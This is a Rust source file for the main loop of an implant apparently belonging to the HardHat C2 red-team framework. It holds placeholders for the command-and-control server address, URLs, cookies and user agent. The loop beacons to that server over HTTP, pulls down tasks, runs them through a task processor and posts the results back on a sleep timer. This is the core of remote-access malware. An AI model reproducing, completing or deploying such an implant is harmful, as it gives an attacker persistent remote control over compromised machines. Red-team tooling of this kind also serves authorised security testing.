#![allow(warnings)]
extern crate core;
mod comms;
mod models;
mod tasking;
mod functions;

use std::collections::HashMap;
use std::string::ToString;
use crate::comms::http_comms::httpComms;
use crate::models::rustyMetadata::rustyMetadata;
use crate::tasking::processing::taskProcessor;
use std::sync::{Arc, mpsc, Mutex};
use std::sync::mpsc::TryRecvError;
use std::thread::sleep;
use once_cell::sync::Lazy;
use serde::Serialize;
use crate::models::rustyTask::rustyTask;
use crate::tasking::commands::{command_base, CommandList};
use crate::comms::base_comms::communication;
use crate::functions::lockHelper::with_lock;
use crate::functions::serialization::serialize;
use crate::models::rustyTaskResult::rustyTaskResult;

static SLEEP_DURATION: Lazy<Mutex<i32>> = Lazy::new(|| Mutex::new(0));
static METADATA: Lazy<Arc<Mutex<rustyMetadata>>> = Lazy::new(||Arc::new(Mutex::new(rustyMetadata::new())));
const IMPLANT_TYPE: &str = "{{REPLACE_IMPLANT_TYPE}}";

// This code is mainly meant to demo creating a HardHat Asset in non c# languages I am not good at rust :)
fn main()
{
    let sleep_time = "{{REPLACE_SLEEP_TIME}}";
    //let sleep_time = "10";
    let sleep_time = sleep_time.parse::<u64>().unwrap_or(5);
    {
        let mut sleep_mut = SLEEP_DURATION.lock().unwrap();
        *sleep_mut = sleep_time as i32;
        // The lock on SLEEP_DURATION is released here
    }
    let (inbound_sender, inbound_receiver) = mpsc::channel();
    let (outbound_sender, outbound_receiver) = mpsc::channel();
    //make the http comm
    let http_comm = httpComms::new("{{REPLACE_CONNECTION_IP}}".to_string(), "{{REPLACE_CONNECTION_PORT}}".parse::<i32>().unwrap_or(8080), false, 500, vec!["{{REPLACE_URLS}}".to_string()],
                                   vec!["{{REPLACE_COOKIES}}".to_string()], vec!["{{REPLACE_REQUEST_HEADERS}}".to_string()], "{{REPLACE_USERAGENT}}".to_string(),
                                   METADATA.clone(), inbound_sender, outbound_receiver);
    //make the task processor
    let task_processor = taskProcessor::new(inbound_receiver, outbound_sender);
    //init the command list
    let mut command_list = CommandList::Init();


    println!("starting main loop");
    loop
    {
        //if there is a task in the outbound queue then send it
        match http_comm.inbound_task_results.try_recv()
        {
            Ok(task_result) =>
            {
                let task_res_array: Vec<rustyTaskResult> = vec![task_result.clone()];

                match serialize(&task_res_array)
                {
                    Ok(serialized_task_result) =>
                    {
                        println!("Sending task result");
                        http_comm.PostData(serialized_task_result);
                    },
                    Err(e) =>
                    {
                        println!("Failed to serialize task result: {}", e);
                    }
                }
            },
            Err(TryRecvError::Empty) =>
            {
                http_comm.GetData();
            }
            Err(TryRecvError::Disconnected) =>
            {
                println!("Disconnected");
                break;
            }
        }
        //this is where a task will be removed and send to the task processor
        //the task processor will then send the result to the outbound queue
        match task_processor.inbound_tasks.try_recv()
        {
            Ok(task) =>
            {
                println!("Processing task");
                task_processor.handle_task(task, &mut command_list)
            },
            Err(TryRecvError::Empty) =>
            {
                println!("no task yet");
            }
            Err(TryRecvError::Disconnected) =>
            {
                println!("Disconnected");
                break;
            }
        }
        //sleep for the specified amount of time
        println!("Sleeping for {} seconds", *SLEEP_DURATION.lock().unwrap());
        sleep(std::time::Duration::from_secs(*SLEEP_DURATION.lock().unwrap() as u64));
        println!("Waking up")
    }
}
